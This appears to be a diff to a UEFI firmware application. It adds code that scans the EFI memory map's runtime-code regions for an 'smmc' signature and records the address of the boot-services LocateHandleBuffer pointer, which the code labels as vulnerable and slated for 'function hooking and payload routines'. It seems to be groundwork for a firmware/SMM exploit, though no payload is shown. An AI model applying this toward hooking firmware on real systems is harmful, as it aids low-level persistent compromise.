@@ -254,6 +254,24 @@ EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL)
 	EFI_ACPI_SDT_PROTOCOL *efi_acpi_sdt_protocol;	
 	EFI_GUID acpi_sdt_guid = EFI_ACPI_SDT_PROTOCOL_GUID;
 
+	/*Variables used for gBS->MemoryMap call and memory parsing for smmc*/
+	UINTN MemoryMapSize = 0;
+	EFI_MEMORY_DESCRIPTOR *MemoryMap = NULL;
+	UINTN MapKey;
+	UINTN DescriptorSize;
+	UINT32 DescriptorVersion;
+	EFI_PHYSICAL_ADDRESS RtCodeStart = 0;
+	EFI_PHYSICAL_ADDRESS RtCodeEnd = 0;
+	EFI_PHYSICAL_ADDRESS smmc_loc= 0;
+	UINT64 RtCodeSize = 0;
+	UINT64 rtcode_offset = 0;
+	
+	/*Variables used for function hooking and payload routines*/
+	void* hooked_fcn_oep = NULL;
+	UINT64 hooked_fcn_oep_addr = 0;
+
+
+	/* Variables used for ACPI table parsing*/
 	EFI_ACPI_SDT_HEADER *efi_acpi_table;	
 	EFI_ACPI_TABLE_VERSION version;
 	UINTN index = 0;
@@ -267,6 +285,60 @@ EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL)
 		&lip_guid,
 		(void **) &efi_acpi_sdt_protocol
 	*/
+	status= gBS->GetMemoryMap(
+		&MemoryMapSize,
+		MemoryMap,
+		&MapKey,
+		&DescriptorSize,
+		&DescriptorVersion
+	);
+
+	if (status == EFI_BUFFER_TOO_SMALL){
+		status=gBS->AllocatePool(
+				EfiBootServicesData,
+				MemoryMapSize,
+				(void**)&MemoryMap);
+		
+		status= gBS->GetMemoryMap(
+			&MemoryMapSize,
+			MemoryMap,
+			&MapKey,
+			&DescriptorSize,
+			&DescriptorVersion
+		);
+		if (! EFI_ERROR(status)){
+			EFI_MEMORY_DESCRIPTOR *efimemmap = MemoryMap;
+			UINTN PAGESIZE = 4096;
+			while (((UINT8*) efimemmap) < (UINT8*)MemoryMap + MemoryMapSize){
+				UINT32 efimmap_type= efimemmap->Type;
+				if(efimmap_type == 5){
+					RtCodeStart = efimemmap->PhysicalStart;
+					RtCodeSize = (UINT64)(efimemmap->NumberOfPages * PAGESIZE);
+					RtCodeEnd = RtCodeStart + (efimemmap->NumberOfPages * PAGESIZE);
+					Print(L"Found Runtime Code address range in memory map: %016llx - %0116llx of size %016llx \n", RtCodeStart, RtCodeEnd, RtCodeSize); 
+				}
+				efimemmap = (EFI_MEMORY_DESCRIPTOR *)((UINT8*)efimemmap + DescriptorSize);
+			}
+
+			if ((RtCodeStart != 0) && (RtCodeEnd != 0)){
+				CHAR8 smmc_string[4]= {0x73, 0x6d, 0x6d, 0x63};
+				for (rtcode_offset=0; rtcode_offset < RtCodeSize; rtcode_offset++){
+					if (CompareMem(((void*)(RtCodeStart+rtcode_offset)), (void*)smmc_string, 4) == 0){
+						smmc_loc=(EFI_PHYSICAL_ADDRESS)(RtCodeStart + rtcode_offset);
+						Print(L"Potential smmc found at %p \n", RtCodeStart+rtcode_offset);
+						break;
+					}
+				}
+			}
+		}
+
+	}
+	Print(L"potentital smmc found at: %p \n", smmc_loc);
+	hooked_fcn_oep = &(gBS->LocateHandleBuffer);
+	hooked_fcn_oep_addr = (UINT64)*(gBS->LocateHandleBuffer);
+
+	Print(L"Vulnerable gBS functionpointer is at offset: %016llx \n", &hooked_fcn_oep);
+	Print(L"Vulnerable gBS function handler is at address: %p \n", hooked_fcn_oep_addr);
 	
 	status= gBS->LocateProtocol(
 		&acpi_sdt_guid,
@@ -300,6 +372,8 @@ EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL)
 		}
 		index++;
 	}
+
+	
 	EFI_SMM_COMMUNICATION_PROTOCOL *smmCommProtocol = NULL;	
 	//EFI_SMM_BASE_PROTOCOL *smmBaseProtocol = NULL;	
 	if ((status = gBS->LocateProtocol(&gEfiSmmCommunicationProtocolGuid, NULL, (VOID **)&smmCommProtocol)) == EFI_SUCCESS){
